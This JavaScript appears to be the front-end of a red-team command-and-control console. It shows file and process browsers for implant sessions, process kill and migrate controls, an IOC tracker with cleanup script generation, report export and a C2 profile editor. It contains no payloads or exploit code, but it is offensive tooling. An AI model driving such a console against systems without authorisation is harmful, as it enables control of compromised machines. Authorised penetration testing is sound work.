  tab.innerHTML = `<span>📁 Files: ${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML = `<div style="display:flex;flex-direction:column;flex:1;min-height:0" id="fb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">Loading file structure...</p></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(dockId);

  // File type icon mapping
  function fileIcon(name, isDir) {
    if (isDir) return '📁';
    const ext = (name.split('.').pop() || '').toLowerCase();
    const map = {
      exe:'⚙️', dll:'🔧', sys:'🖥️', msi:'📦', bat:'📜', cmd:'📜', ps1:'💠', psm1:'💠', psd1:'💠',
      txt:'📄', log:'📋', cfg:'⚙️', ini:'⚙️', conf:'⚙️', xml:'📰', json:'📰', yaml:'📰', yml:'📰', toml:'📰',
      html:'🌐', htm:'🌐', css:'🎨', js:'📐', ts:'📐', jsx:'📐', tsx:'📐', py:'🐍', go:'🔵', rs:'🦀', c:'©️', cpp:'©️', h:'©️', cs:'💜', java:'☕', rb:'💎', php:'🐘',
      zip:'📦', rar:'📦', '7z':'📦', tar:'📦', gz:'📦', bz2:'📦', xz:'📦',
      png:'🖼️', jpg:'🖼️', jpeg:'🖼️', gif:'🖼️', bmp:'🖼️', ico:'🖼️', svg:'🖼️', webp:'🖼️',
      mp3:'🎵', wav:'🎵', flac:'🎵', ogg:'🎵', m4a:'🎵',
      mp4:'🎬', avi:'🎬', mkv:'🎬', mov:'🎬', wmv:'🎬',
      pdf:'📕', doc:'📘', docx:'📘', xls:'📗', xlsx:'📗', ppt:'📙', pptx:'📙', csv:'📊',
      db:'🗃️', sqlite:'🗃️', sql:'🗃️', mdb:'🗃️',
      key:'🔑', pem:'🔑', crt:'🔑', cer:'🔑', pfx:'🔑',
      lnk:'🔗', url:'🔗', iso:'💿', img:'💿', vhd:'💿', vmdk:'💿',
    };
    return map[ext] || '📄';
  }

  function fileTypeLabel(name, isDir) {
    if (isDir) return 'File Folder';
    const ext = (name.split('.').pop() || '').toLowerCase();
    const labels = {
      exe:'Application', dll:'DLL Library', sys:'System File', msi:'Installer', bat:'Batch Script', cmd:'Command Script', ps1:'PowerShell Script',
      txt:'Text File', log:'Log File', cfg:'Config File', ini:'Config File', xml:'XML File', json:'JSON File', yaml:'YAML File',
      html:'HTML File', py:'Python Script', go:'Go Source', rs:'Rust Source', c:'C Source', cpp:'C++ Source', cs:'C# Source',
      zip:'ZIP Archive', rar:'RAR Archive', tar:'TAR Archive', gz:'GZip Archive',
      png:'PNG Image', jpg:'JPEG Image', jpeg:'JPEG Image', gif:'GIF Image', bmp:'Bitmap Image',
      pdf:'PDF Document', doc:'Word Document', docx:'Word Document', xls:'Excel Spreadsheet', xlsx:'Excel Spreadsheet',
      pem:'PEM Certificate', crt:'Certificate', key:'Private Key',
    };
    return labels[ext] || (ext ? ext.toUpperCase() + ' File' : 'Unknown File');
  }

  // Path helpers
  function splitPath(p) {
    p = (p || '').replace(/\\/g, '/').replace(/\/+$/, '');
    if (!p || p === '.') return [];
    return p.split('/').filter(Boolean);
  }
  function joinPath(parts) { return parts.length ? parts.join('/') : '.'; }

  const history = [];
  let histIdx = -1;
  let currentPath = '.';

  // Render the right preview panel from a file entry
  function showPreview(f, fullPath) {
    const pv = document.getElementById(`fb-preview-${dockId}`);
    if (!pv) return;
    if (!f) {
      pv.innerHTML = `<div class="fb-preview-empty">Select a file to see details</div>`;
      return;
    }
    const icon = fileIcon(f.name, f.isDir);
    const typeLabel = fileTypeLabel(f.name, f.isDir);
    const size = f.isDir ? '—' : fmtSize(f.size);
    pv.innerHTML = `
      <div class="fb-preview-icon">${icon}</div>
      <div class="fb-preview-name">${esc(f.name)}</div>
      <div class="fb-preview-type">${typeLabel}</div>
      <div class="fb-preview-divider"></div>
      <div class="fb-preview-row"><span class="fb-preview-label">Path</span><span class="fb-preview-val">${esc(fullPath)}</span></div>
      <div class="fb-preview-row"><span class="fb-preview-label">Size</span><span class="fb-preview-val">${size}</span></div>
      <div class="fb-preview-row"><span class="fb-preview-label">Mode</span><span class="fb-preview-val">${esc(f.mode || '—')}</span></div>
      ${f.isDir ? `<div class="fb-preview-tip">Double-click to enter folder</div>` : `
      <div class="fb-preview-actions">
        <button class="fb-preview-btn" id="fb-dl-${dockId}" data-path="${esc(fullPath)}">⬇ Download</button>
        <button class="fb-preview-btn danger" id="fb-del-${dockId}" data-path="${esc(fullPath)}">🗑 Delete</button>
      </div>`}
    `;
    // Wire download (placeholder)
    pv.querySelector(`#fb-dl-${dockId}`)?.addEventListener('click', () => {
      toast('info', `Download: use 'download ${fullPath}' in the session console`);
    });
    // Wire delete
    pv.querySelector(`#fb-del-${dockId}`)?.addEventListener('click', async () => {
      const ok = await uiConfirm(`Delete '${f.name}'?`, { title: 'Delete File', okLabel: 'Delete', danger: true });
      if (!ok) return;
      const err = await App().FileBrowserDelete(sessionID, fullPath).catch(e => e.toString());
      if (err) { toast('error', err); return; }
      toast('ok', `Deleted: ${f.name}`);
      renderDir(currentPath, false);
    });
  }

  async function renderDir(path, addToHistory) {
    const container = document.getElementById(`fb-dock-${dockId}`);
    if (!container) return;
    const result = await App().FileBrowserList(sessionID, path);
    if (result.error) { toast('error', result.error); container.innerHTML = `<p style="padding:10px;color:var(--accent)">Error: ${esc(result.error)}</p>`; return; }
    currentPath = result.path || path;

    if (addToHistory !== false) {
      histIdx++;
      history.length = histIdx;
      history.push(currentPath);
    }

    const parts = splitPath(currentPath);
    let crumbs = '';
    for (let i = 0; i < parts.length; i++) {
      const partial = joinPath(parts.slice(0, i + 1));
      crumbs += `<span class="fb-crumb" data-nav="${esc(partial)}">${esc(parts[i])}</span>`;
      if (i < parts.length - 1) crumbs += '<span class="fb-sep">›</span>';
    }

    const sorted = (result.files || []).slice().sort((a, b) => {
      if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
      return (a.name || '').localeCompare(b.name || '');
    });
    const dirCount = sorted.filter(f => f.isDir).length;
    const fileCount = sorted.length - dirCount;

    let html = `<div class="file-browser">
      <div class="fb-toolbar">
        <button class="fb-nav-btn" id="fb-back-${dockId}" title="Back"${histIdx <= 0 ? ' disabled' : ''}>◀</button>
        <button class="fb-nav-btn" id="fb-fwd-${dockId}" title="Forward"${histIdx >= history.length - 1 ? ' disabled' : ''}>▶</button>
        <button class="fb-nav-btn" id="fb-up-${dockId}" title="Up one level">⬆</button>
        <button class="fb-nav-btn" id="fb-refresh-${dockId}" title="Refresh">🔄</button>
        <div class="fb-addressbar">${crumbs || '<span class="fb-crumb" style="color:var(--muted)">.</span>'}</div>
      </div>
      <div class="fb-body-split">
        <div class="fb-left-pane">
          <div class="fb-col-header">
            <span></span><span>Name</span><span style="text-align:right">Size</span><span>Mode</span>
          </div>
          <div class="fb-list" id="fb-list-${dockId}">`;

    sorted.forEach(f => {
      const cls = f.isDir ? 'fb-item dir' : 'fb-item';
      const icon = fileIcon(f.name, f.isDir);
      const size = f.isDir ? '—' : fmtSize(f.size);
      html += `<div class="${cls}" data-path="${esc(currentPath + '/' + f.name)}" data-name="${esc(f.name)}" data-dir="${f.isDir}" data-size="${f.size||0}" data-mode="${esc(f.mode||'')}">
        <span class="fb-icon">${icon}</span>
        <span class="fb-name">${esc(f.name)}</span>
        <span class="fb-size">${size}</span>
        <span class="fb-date">${esc(f.mode || '')}</span>
      </div>`;
    });

    html += `</div></div>
        <div class="fb-right-pane" id="fb-preview-${dockId}">
          <div class="fb-preview-empty">Select a file to see details</div>
        </div>
      </div>
      <div class="fb-status">
        <span>${sorted.length} items</span>
        <span>${dirCount} folders, ${fileCount} files</span>
      </div>
    </div>`;
    container.innerHTML = html;

    // Wire navigation
    container.querySelector(`#fb-back-${dockId}`)?.addEventListener('click', () => { if (histIdx > 0) { histIdx--; renderDir(history[histIdx], false); } });
    container.querySelector(`#fb-fwd-${dockId}`)?.addEventListener('click', () => { if (histIdx < history.length - 1) { histIdx++; renderDir(history[histIdx], false); } });
    container.querySelector(`#fb-up-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath + '/..'); });
    container.querySelector(`#fb-refresh-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath, false); });
    container.querySelectorAll('.fb-crumb[data-nav]').forEach(c => c.addEventListener('click', () => renderDir(c.dataset.nav)));

    // Row: single-click → preview; double-click → navigate into dir
    let selectedItem = null;
    container.querySelectorAll('.fb-item').forEach(item => {
      item.addEventListener('click', () => {
        if (selectedItem) selectedItem.classList.remove('selected');
        item.classList.add('selected');
        selectedItem = item;
        const f = { name: item.dataset.name, isDir: item.dataset.dir === 'true', size: parseInt(item.dataset.size)||0, mode: item.dataset.mode };
        showPreview(f, item.dataset.path);
      });
      item.addEventListener('dblclick', () => { if (item.dataset.dir === 'true') renderDir(item.dataset.path); });
    });
  }
  renderDir(currentPath);
}

// ── Process Browser Panel ────────────────────────────────────────────────────
async function openProcessBrowser(sessionID) {
  const dockId = `procs-${sessionID}`;
  if (openTabs[dockId]) { activateTab(dockId); return; }
  openTabs[dockId] = { kind: 'dock' };
  document.getElementById('empty-interact')?.remove();

  const tab = document.createElement('button'); tab.className = 'interact-tab'; tab.dataset.tid = dockId;
  tab.innerHTML = `<span>⚙️ Procs: ${sessionID.slice(0,6)}</span><span class="close-x" data-cid="${dockId}">x</span>`;
  tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(dockId); });
  document.getElementById('interact-tabs').appendChild(tab);

  const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
  panel.innerHTML = `<div style="overflow:auto;flex:1;display:flex;flex-direction:column" id="pb-dock-${dockId}"><p style="padding:10px;color:var(--muted)">Loading processes...</p></div>`;
  document.getElementById('interact-panels').appendChild(panel);
  activateTab(dockId);

  // Process icon based on executable name
  function procIcon(exe, owner) {
    const e = (exe || '').toLowerCase();
    const o = (owner || '').toLowerCase();
    if (e === 'system' || e === 'system idle process' || e === '[system process]') return '🖥️';
    if (e === 'svchost.exe') return '🔩';
    if (e === 'csrss.exe' || e === 'smss.exe' || e === 'wininit.exe' || e === 'winlogon.exe' || e === 'lsass.exe' || e === 'services.exe') return '🛡️';
    if (e === 'explorer.exe') return '📁';
    if (e === 'cmd.exe' || e === 'powershell.exe' || e === 'pwsh.exe' || e === 'conhost.exe' || e === 'windowsterminal.exe') return '💻';
    if (e.includes('chrome') || e.includes('firefox') || e.includes('msedge') || e.includes('brave') || e.includes('opera')) return '🌐';
    if (e.includes('defender') || e.includes('malware') || e.includes('antivirus') || e.includes('security')) return '🛡️';
    if (e === 'taskmgr.exe' || e === 'procexp.exe' || e === 'procmon.exe') return '📊';
    if (e === 'notepad.exe' || e === 'code.exe' || e.includes('devenv') || e.includes('sublime') || e.includes('vim')) return '📝';
    if (e === 'mmc.exe' || e === 'regedit.exe') return '⚙️';
    if (e === 'dwm.exe' || e === 'fontdrvhost.exe') return '🎨';
    if (e === 'spoolsv.exe') return '🖨️';
    if (e === 'audiodg.exe' || e.includes('audio')) return '🔊';
    if (o.includes('system') || o.includes('local service') || o.includes('network service')) return '⚙️';
    return '▪️';
  }

  async function loadProcs() {
    const container = document.getElementById(`pb-dock-${dockId}`);
    if (!container) return;
    const result = await App().ProcessBrowserList(sessionID);
    if (result.error) { toast('error', result.error); container.innerHTML = `<p style="padding:10px;color:var(--accent)">Error: ${esc(result.error)}</p>`; return; }

    const allProcs = result.processes.sort((a, b) => a.pid - b.pid);

    let html = `<div class="proc-browser">
      <div class="proc-toolbar">
        <input class="proc-search" id="proc-filter-${dockId}" type="text" placeholder="🔍 Filter processes..." />
        <button class="proc-tb-btn" id="proc-refresh-${dockId}">🔄 Refresh</button>
        <button class="proc-tb-btn danger" id="proc-kill-btn-${dockId}">☠️ Kill</button>
        <button class="proc-tb-btn" id="proc-migrate-btn-${dockId}">🎯 Migrate</button>
      </div>
      <div class="proc-col-header">
        <span></span><span>PID</span><span>PPID</span><span>Name</span><span>Owner</span><span>Arch</span>
      </div>
      <div class="proc-list" id="proc-rows-${dockId}">`;

    allProcs.forEach(p => {
      const icon = procIcon(p.executable, p.owner);
      const o = (p.owner || '').toLowerCase();
      const isSystem = o.includes('system') || o.includes('local service') || o.includes('network service');
      const isSelf = p.sessionID === sessionID && (p.executable || '').toLowerCase().includes('implant'); // heuristic
      const cls = isSystem ? 'proc-item proc-system' : (isSelf ? 'proc-item proc-highlight' : 'proc-item');
      html += `<div class="${cls}" data-pid="${p.pid}" data-search="${esc((p.executable + ' ' + (p.owner || '') + ' ' + p.pid).toLowerCase())}">
        <span class="proc-icon">${icon}</span>
        <span class="proc-pid">${p.pid}</span>
        <span class="proc-pid">${p.ppid}</span>
        <span class="proc-exe">${esc(p.executable)}</span>
        <span class="proc-owner">${esc(p.owner || '')}</span>
        <span class="proc-arch">${esc(p.arch || '')}</span>
      </div>`;
    });

    html += `</div>
      <div class="proc-status">
        <span id="proc-count-${dockId}">${allProcs.length} processes</span>
        <span id="proc-selected-${dockId}">No process selected</span>
      </div>
    </div>`;
    container.innerHTML = html;

    // Search / filter
    const filterInput = container.querySelector(`#proc-filter-${dockId}`);
    const rowsContainer = container.querySelector(`#proc-rows-${dockId}`);
    const countLabel = container.querySelector(`#proc-count-${dockId}`);
    filterInput?.addEventListener('input', () => {
      const q = filterInput.value.toLowerCase();
      let visible = 0;
      rowsContainer.querySelectorAll('.proc-item').forEach(row => {
        const match = !q || (row.dataset.search || '').includes(q);
        row.style.display = match ? '' : 'none';
        if (match) visible++;
      });
      countLabel.textContent = q ? `${visible} / ${allProcs.length} processes` : `${allProcs.length} processes`;
    });

    // Row selection
    let selectedPID = null;
    container.querySelectorAll('.proc-item').forEach(item => {
      item.addEventListener('click', () => {
        container.querySelectorAll('.proc-item').forEach(i => i.classList.remove('selected'));
        item.classList.add('selected');
        selectedPID = parseInt(item.dataset.pid);
        container.querySelector(`#proc-selected-${dockId}`).textContent = `Selected: PID ${selectedPID} — ${item.querySelector('.proc-exe')?.textContent || ''}`;
      });
    });

    // Action buttons
    container.querySelector(`#proc-refresh-${dockId}`)?.addEventListener('click', () => loadProcs());
    container.querySelector(`#proc-kill-btn-${dockId}`)?.addEventListener('click', async () => {
      if (!selectedPID) { toast('info', 'Select a process first'); return; }
      const ok = await uiConfirm(`Kill PID ${selectedPID}?`, { title: 'Kill Process', okLabel: 'Kill', danger: true });
      if (!ok) return;
      await App().ProcessBrowserKill(sessionID, selectedPID);
      toast('ok', `Killed PID ${selectedPID}`);
      loadProcs();
    });
    container.querySelector(`#proc-migrate-btn-${dockId}`)?.addEventListener('click', () => {
      if (!selectedPID) { toast('info', 'Select a process first'); return; }
      toast('info', `Migrate into PID ${selectedPID} — use 'migrate ${selectedPID} <profile>' in console`);
    });
  }
  loadProcs();
}

// ── Context Menu Handlers for File/Process Browser ───────────────────────────
document.getElementById('ctx-files')?.addEventListener('click', () => {
  if (activeCtxAgent && activeCtxAgent.kind === 'session') openFileBrowser(activeCtxAgent.obj.id);
  else if (activeCtxAgent) toast('info', 'File browser requires an interactive session (not a beacon)');
  document.getElementById('ctx-menu').classList.add('hidden');
});
document.getElementById('ctx-processes')?.addEventListener('click', () => {
  if (activeCtxAgent && activeCtxAgent.kind === 'session') openProcessBrowser(activeCtxAgent.obj.id);
  else if (activeCtxAgent) toast('info', 'Process browser requires an interactive session (not a beacon)');
  document.getElementById('ctx-menu').classList.add('hidden');
});

// ── Auto-start timer on first beacon ─────────────────────────────────────────
function onFirstAgent() {
  if (!engagementTimerInterval) startEngagementTimer();
  refreshKillChain();
}

// ── Sound on new beacon/session ──────────────────────────────────────────────
function playBeaconSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.value = 800;
    osc.type = 'sine';
    gain.gain.value = 0.1;
    osc.start();
    osc.stop(ctx.currentTime + 0.15);
    setTimeout(() => {
      const osc2 = ctx.createOscillator();
      osc2.connect(gain);
      osc2.frequency.value = 1200;
      osc2.type = 'sine';
      osc2.start();
      osc2.stop(ctx.currentTime + 0.1);
    }, 180);
  } catch(e) {}
}

// ── IOC Tracker Panel ────────────────────────────────────────────────────────
async function openIOCPanel() {
  const iocs = await App().GetIOCs().catch(() => []);
  const iocTypeColor = { file:'var(--warn)', service:'var(--accent)', regkey:'var(--info)', schtask:'var(--ok)', user:'var(--cyan)', cron:'var(--muted)' };

  let html = `<div class="ioc-panel" style="display:flex;flex-direction:column;gap:0">
    <div style="display:flex;gap:8px;padding:0 0 12px 0;align-items:center;flex-wrap:wrap">
      <button id="ioc-cleanup-btn" class="btn small">Generate Cleanup Script</button>
      <button id="ioc-add-btn" class="btn small">+ Add Manual IOC</button>
      <button id="ioc-clear-btn" class="btn small">Clear All</button>
      <span class="spacer"></span>
      <span style="color:var(--muted);font-size:11px">${iocs.length} IOC(s) tracked</span>
    </div>`;

  if (iocs.length === 0) {
    html += `<div style="padding:24px 0;text-align:center;color:var(--muted);font-size:12px">
      <div style="font-size:28px;margin-bottom:8px">🔍</div>
      No IOCs tracked yet.<br>IOCs are recorded automatically when persistence/spawn scripts run.
    </div>`;
  } else {
    html += `<table class="data-table" style="font-size:11px"><thead><tr>
      <th>#</th><th>Time</th><th>Host</th><th>Type</th><th>Path</th><th>Detail</th>
    </tr></thead><tbody>`;
    iocs.forEach(i => {
      const col = iocTypeColor[i.type] || 'var(--muted)';
      html += `<tr>
        <td style="color:var(--muted);font-family:var(--mono)">${i.id}</td>
        <td style="color:var(--muted)">${i.timestamp}</td>
        <td>${esc(i.host)}</td>
        <td><span style="color:${col};font-weight:700;font-size:10px;text-transform:uppercase;background:${col}18;border:1px solid ${col}40;padding:1px 6px;border-radius:3px">${i.type}</span></td>
        <td style="font-family:var(--mono);color:var(--text-dim)">${esc(i.path)}</td>
        <td style="color:var(--muted)">${esc(i.detail)}</td>
      </tr>`;
    });
    html += '</tbody></table>';
  }
  html += '<pre id="ioc-script-output" class="scr-output" style="display:none;margin-top:12px"></pre></div>';

  openViewPanel('iocs', 'IOC Tracker', html);

  document.getElementById('ioc-cleanup-btn')?.addEventListener('click', async () => {
    const script = await App().GenerateCleanupScript();
    const out = document.getElementById('ioc-script-output');
    out.style.display = 'block';
    out.textContent = script;
  });
  document.getElementById('ioc-clear-btn')?.addEventListener('click', async () => {
    const ok = await uiConfirm('Clear all tracked IOCs?', { title: 'Clear IOCs', okLabel: 'Clear', danger: true });
    if (!ok) return;
    await App().ClearIOCs();
    openIOCPanel();
  });
  document.getElementById('ioc-add-btn')?.addEventListener('click', async () => {
    const host = await uiPrompt('Host (IP or hostname):', '', { title: 'Add IOC – Host' });
    if (!host) return;
    const type = await uiPrompt('Type (file/service/regkey/schtask/user/cron):', 'file', { title: 'Add IOC – Type' });
    if (!type) return;
    const path = await uiPrompt('Path / Name:', '', { title: 'Add IOC – Path' });
    if (!path) return;
    const detail = await uiPrompt('Detail (optional):', '', { title: 'Add IOC – Detail' }) || '';
    await App().AddIOC(host, type, path, detail);
    openIOCPanel();
  });
}

// ── Export Report ────────────────────────────────────────────────────────────
async function exportReport() {
  const report = await App().GenerateReport().catch(e => '# Error generating report\n\n' + e);
  const html = `<div style="display:flex;flex-direction:column;gap:10px;flex:1;min-height:0">
    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button id="report-copy-btn" class="btn small">Copy to Clipboard</button>
      <button id="report-console-btn" class="btn small">Print to Console</button>
      <span id="report-status" style="color:var(--muted);font-size:11px"></span>
    </div>
    <pre id="report-content" class="scr-output" style="flex:1;min-height:300px;overflow:auto;white-space:pre-wrap;word-break:break-word;font-size:11.5px;line-height:1.6">${esc(report)}</pre>
  </div>`;
  openViewPanel('_report', 'Engagement Report', html);

  document.getElementById('report-copy-btn')?.addEventListener('click', () => {
    navigator.clipboard.writeText(report).then(() => {
      document.getElementById('report-status').textContent = 'Copied!';
      toast('ok', 'Report copied to clipboard');
    }).catch(() => {
      const el = document.getElementById('report-content');
      const range = document.createRange(); range.selectNodeContents(el);
      const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
      document.getElementById('report-status').textContent = 'Text selected — Ctrl+C to copy';
    });
  });

  document.getElementById('report-console-btn')?.addEventListener('click', () => {
    // Print the report into the active session console tab
    const panelId = activeInteractId ? `ip-${activeInteractId}` : null;
    const out = panelId ? document.querySelector(`#${panelId} .console-out`) : null;
    if (out) {
      const block = document.createElement('div');
      block.className = 'out';
      block.style.cssText = 'white-space:pre-wrap;color:var(--text-dim);font-size:11px;border-top:1px solid var(--border);padding:8px 0;margin-top:4px';
      block.textContent = report;
      out.appendChild(block);
      out.scrollTop = out.scrollHeight;
      hideModal();
      toast('ok', 'Report printed to console');
    } else {
      toast('info', 'Open a session tab first, then use Print to Console');
    }
  });
}

// ── C2 Profile Editor ─────────────────────────────────────────────────────────
async function openC2ProfileEditor() {
  const profiles = await App().ListHTTPC2Profiles().catch(() => []);
  let profileOpts = profiles.length
    ? profiles.map(p => `<div class="c2p-item" data-name="${esc(p.name)}">${esc(p.name)}</div>`).join('')
    : '<div style="color:var(--muted);padding:10px;font-size:11px">No HTTP C2 profiles found</div>';

  const html = `<div class="c2-editor">
    <div class="c2-left">
      <div class="c2-list-header">HTTP C2 Profiles</div>
      <div class="c2-profile-list" id="c2-profile-list">${profileOpts}</div>
      <div class="c2-list-footer">
        <button class="btn small" id="c2-new-btn">+ New Profile</button>
      </div>
    </div>
    <div class="c2-right">
      <div class="c2-editor-toolbar">
        <span class="c2-editor-name" id="c2-active-name">Select a profile to edit</span>
        <span class="spacer"></span>
        <button class="btn small" id="c2-save-btn">Save (Overwrite)</button>
        <button class="btn small" id="c2-save-new-btn">Save as New</button>
      </div>
      <textarea class="c2-json-editor" id="c2-json-editor" placeholder='{ &quot;name&quot;: &quot;my-profile&quot;, ... }' spellcheck="false"></textarea>
      <div class="c2-editor-status" id="c2-editor-status"></div>
    </div>
  </div>`;

  openViewPanel('c2profiles', 'C2 Profile Editor', html);

  const editor = document.getElementById('c2-json-editor');
  const status = document.getElementById('c2-editor-status');
  const activeName = document.getElementById('c2-active-name');
  let currentProfileName = null;

  // Load profile into editor
  async function loadProfile(name) {
    status.textContent = 'Loading...';
    const json = await App().GetHTTPC2Profile(name).catch(e => null);
    if (!json) { status.textContent = 'Failed to load profile'; return; }
    editor.value = json;
    currentProfileName = name;
    activeName.textContent = name;
    status.textContent = `Loaded: ${name}`;
    document.querySelectorAll('.c2p-item').forEach(el => el.classList.toggle('active', el.dataset.name === name));
  }

  document.querySelectorAll('.c2p-item').forEach(el => {
    el.addEventListener('click', () => loadProfile(el.dataset.name));
  });

  document.getElementById('c2-save-btn')?.addEventListener('click', async () => {
    const json = editor.value.trim();
    if (!json) { status.textContent = 'Editor is empty'; return; }
    status.textContent = 'Saving...';
    const err = await App().SaveHTTPC2Profile(json, true).catch(e => e.toString());
    if (err) { status.textContent = 'Error: ' + err; toast('error', err); return; }
    status.textContent = 'Saved!';
    toast('ok', 'C2 profile saved (overwrite)');
  });

  document.getElementById('c2-save-new-btn')?.addEventListener('click', async () => {
    const json = editor.value.trim();
    if (!json) { status.textContent = 'Editor is empty'; return; }
    status.textContent = 'Saving as new...';
    const err = await App().SaveHTTPC2Profile(json, false).catch(e => e.toString());
    if (err) { status.textContent = 'Error: ' + err; toast('error', err); return; }
    status.textContent = 'Saved as new profile!';
    toast('ok', 'New C2 profile created');
    openC2ProfileEditor(); // refresh list
  });

  document.getElementById('c2-new-btn')?.addEventListener('click', () => {
    editor.value = JSON.stringify({ name: 'new-profile', implantConfig: {}, serverConfig: {} }, null, 2);
    currentProfileName = null;
    activeName.textContent = 'New Profile';
    status.textContent = 'Edit JSON and click "Save as New"';
    document.querySelectorAll('.c2p-item').forEach(el => el.classList.remove('active'));
  });
}

// Wire up sound & count check interval
if (typeof window !== 'undefined') {
  let lastAgentCount = 0;
  setInterval(async () => {
    try {
      const sessions = await App().ListSessions().catch(() => []);
      const beacons = await App().ListBeacons().catch(() => []);
      const total = (sessions?.length || 0) + (beacons?.length || 0);
      if (total > lastAgentCount && lastAgentCount > 0) {
        playBeaconSound();
      }
      lastAgentCount = total;
    } catch(e) {}
  }, 5000);
}

